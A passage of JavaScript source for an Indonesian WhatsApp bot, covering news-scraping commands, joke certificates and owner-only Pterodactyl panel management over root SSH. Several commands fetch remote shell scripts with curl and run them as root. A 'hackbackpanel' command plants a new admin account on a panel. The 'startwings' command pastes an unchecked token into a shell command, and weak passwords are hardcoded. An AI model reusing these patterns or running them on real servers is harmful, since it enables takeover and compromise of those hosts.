    reply(`✅ Berhasil menambahkan ${count} limit ke ${target}`)
}
break
//=================================================//
case 'dailynews': {
DailyNews().then(async(res) => {
no = 0
iwannnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnn += ""
TradzSigma.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnn }, { quoted:m })
})
}
break
//=================================================//
case 'inews': {
iNews().then(async(res) => {
no = 0
iwannnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnn += ""
reply(iwannnnnnnnnn) 
})
}
break
//=================================================//
case 'okezone': {
  try {
OkezoneNews().then(async(res) => {
no = 0
iwannnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnn += ""
const thumb = res[0].berita_thumb || '';
TradzSigma.sendMessage(m.chat, { image : { url : thumb }, caption: iwannnnnnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break
//=================================================//
case 'sindo':{
SindoNews().then(async(res) => {
no = 0
iwannnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnn += ""
reply(iwannnnnnnnnnnn) 
})
}
break
//=================================================//
case 'tempo': {
  try {
TempoNews().then(async(res) => {
no = 0
iwannnnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnn += ""
const thumb = res[0].berita_thumb || '';
TradzSigma.sendMessage(m.chat, { image : { url : thumb }, caption: iwannnnnnnnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break
//=================================================//
case 'antara':{
  try {
AntaraNews().then(async(res) => {
no = 0
iwannnnnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnn += ""
const thumb = res[0].berita_thumb || '';
TradzSigma.sendMessage(m.chat, { image : { url : thumb }, caption: iwannnnnnnnnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break
//=================================================//
case 'kontan':{
  try {
KontanNews().then(async (res) => {
iwannnnnnnnnnnnnnn = ""
no = 0
for (let i of res) {
no += 1
iwannnnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnnn += ""
TradzSigma.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break
//=================================================//
case 'merdeka': {
  try {
MerdekaNews().then(async (res) => {
iwannnnnnnnnnnnnnnn = ""
no = 0
for (let i of res) {
no += 1
iwannnnnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnnnn += ""
const thumb = res[0].berita_thumb || '';
TradzSigma.sendMessage(m.chat, { image : { url : thumb }, caption: iwannnnnnnnnnnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break
//=================================================//
case 'jalantikus': {
var reis = await JalanTikusMeme()
tekcs = ""
tekcs += "Jalan Tikus Meme\n\n"
tekcs += `Source: ${reis}`
tekcs += ""
TradzSigma.sendMessage(m.chat, { image : { url : reis }, caption: tekcs }, { quoted:m })
}
break
//=================================================//
case 'stkbaik': {
    generateAndSendCertificate(pushname, "Anda dinyatakan Baik!");
    break;
  }
  break
  case 'stkcantik': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Cantik!");
    break;
  }
  break
  case 'stkganteng': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Ganteng!");
    break;
  }
  break
  case 'stkhitam': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Berkelas Hitam!");
    break;
  }
  break
  case 'stkmiskin': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Miskin!");
    break;
  }
  break
  case 'stkkaya': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Kaya!");
    break;
  }
  break
  case 'stkmarah': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Marah!");
    break;
  }
  break
  case 'stksabar': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Sabar!");
    break;
  }
  break
  case 'stksakiti': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Suka Menyakiti!");
    break;
  }
  break
  case 'stkkeren': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Keren!");
    break;
  }
  break
  case 'stkmisterius': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Misterius!");
    break;
  }
  break
  case 'stksantai': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Santai!");
    break;
  }
  break
  case 'stksombong': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Sombong!");
    break;
  }
  break
  case 'stklucu': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Lucu!");
    break;
  }
  break
  case 'stkgila': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Gila!");
  }
  break
//================================================================================
case "uninstalltema": {
if (!TradID) return reply(mess.only.owner)
if (!text || !text.split("|")) return m.reply("ipvps|pwvps")
let vii = text.split("|")
if (vii.length < 2) return m.reply("ipvps|pwvps")
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await replyviex("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await replyviex("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`)
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
replyviex('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
//================================================================================
case "installtemastellar": case "installtemastelar": {
if (!TradID) return reply(mess.only.owner)
if (!text || !text.split("|")) return m.reply("ipvps|pwvps")
let vii = text.split("|")
if (vii.length < 2) return m.reply("ipvps|pwvps")
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!TradID) return reply(mess.only.owner)
if (global.installtema == undefined) return replyviex("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
replyviex("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await replyviex("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
replyviex('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================
case "installtemabilling": case "instaltemabiling": {
if (!TradID) return reply(mess.only.owner)
if (!text || !text.split("|")) return m.reply("ipvps|pwvps")
let vii = text.split("|")
if (vii.length < 2) return m.reply("ipvps|pwvps")
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return replyviex("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
replyviex("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await replyviex("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
replyviex('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
//================================================================================
case "installtemaenigma": 
case "instaltemaenigma": {
if (!TradID) return reply(mess.only.owner)
if (!text || !text.split("|")) return m.reply("ipvps|pwvps")
let vii = text.split("|")
if (vii.length < 2) return m.reply("ipvps|pwvps")
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return replyviex("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
replyviex("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await replyviex("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6283182739135\n');
stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s\n');
stream.write('https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
replyviex('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
//================================================================================
case "uninstallpanel": {
if (!TradID) return m.reply(mess.only.owner);
if (!text || !text.split("|")) return m.reply("ipvps|pwvps")
var vpsnya = text.split("|")
if (vpsnya.length < 2) return replyviex("ipvps|pwvps")
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await replyviex("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await replyviex("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
replyviex('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
replyviex('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break
//================================================================================
case 'installpanel': {
if (!TradID) return reply(mess.only.owner)
if (!text) return replyviex(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return replyviex(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "121"
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await TradzSigma.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By dinzyoimiyaID\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By dinzyoimiyaID\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await replyviex("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break  
//================================================================================
case "startwings": case "configurewings": {
if (!TradID) return reply(mess.only.owner)
let t = text.split('|')
if (t.length < 3) return replyviex(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await replyviex("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
replyviex('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
//================================================================================
case "hbpanel": case "hackbackpanel": {
if (!TradID) return reply(mess.only.owner)
let t = text.split('|')
if (t.length < 2) return m.reply("ipvps|pwvps")

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await TradzSigma.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
replyviex('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
//==================================================================
case 'listusr': {
  if (!TradID) return reply(mess.only.owner)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await TradzSigma.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
        case 'delsrv': {
      if (!TradID) return reply(`Khusus ${global.namabot} Aja`)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
        break
        case 'delusr': {
  if (!TradID) return reply(`Khusus ${global.namabot} Aja`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return replyviex('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
                
case 'listsrv': {
  if (!TradID) return replyviex(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await TradzSigma.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;

case 'tutorial': {
const owned = `6283844671188@s.whatsapp.net`
const text12 = DinzIDliatwaktu + ` *@${sender.split("@")[0]}*

▭▬▭( *TUTOR RUN* )▭▬▭

*TUTOR RUN BOT*
( https://youtu.be/rqqxkI4P8YY )

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
TradzSigma.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break

case 'ramlist': { 
const owned = `6283182739135@s.whatsapp.net`
const text12 = DinzIDliatwaktu + ` *@${sender.split("@")[0]}*

▭▬▭▬▭( *SERVER V1* )▭▬▭▬▭

.1gb [username,nomor]
.2gb [username,nomor]
.3gb [username,nomor]
.4gb [username,nomor]
.5gb [username,nomor]
.6gb [username,nomor]
.7gb [username,nomor]
.8gb [username,nomor]
.unli [username,nomor]

Contoh:
.ram username,nomor
.1gb DinzID Chx,6283182739135
▬▭▬▭▬▭▬▭▬▭▬▭▬

▭▬▭▬▭( *SERVER V2* )▭▬▭▬▭

.srv21gb [username,nomor]
.srv22gb [username,nomor]
.srv23gb [username,nomor]
.srv24gb [username,nomor]
.srv25gb [username,nomor]
.srv26gb [username,nomor]
.srv27gb [username,nomor]
.srv2unli [username,nomor]

Contoh:
.srv2(RAM PANEL) username,nomor
.srv21gb DinzID Chx,6283182739135
▬▭▬▭▬▭▬▭▬▭▬▭▬`
TradzSigma.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
} freya = fs.readFileSync('./freya/ramlist.mp3')
TradzSigma.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
case 'premlist':{
if (!TradID) return replyviex(mess.owner)
let listprem =`*LIST SELER ${global.namabot}*\n\nTotal Seller : ${owner.length}\n`
var no = 1
for (let x of owner) {
listprem +=`\nUser: ${no++}\nID: ${x}\n\n`
}
listprem +=`Untuk Menghapus Akses Prem Ketik ${prefix}delprem 628xxx/@tag`
TradzSigma.sendMessage(m.chat, {text: listprem },{quoted: TradzSigma.chat})
}
break
case 'addsrv': {
if (!TradID) return replyviex(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
let s = text.split(',');
if (s.length < 7) return replyviex(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
// = data.attributes.pStartup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "🐺 BUYER DinzID Chx 🐺 || PANEL NYA DI PAKEK YA BUB >•<",
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "/usr/local/bin/${CMD_RUN};",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start",
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
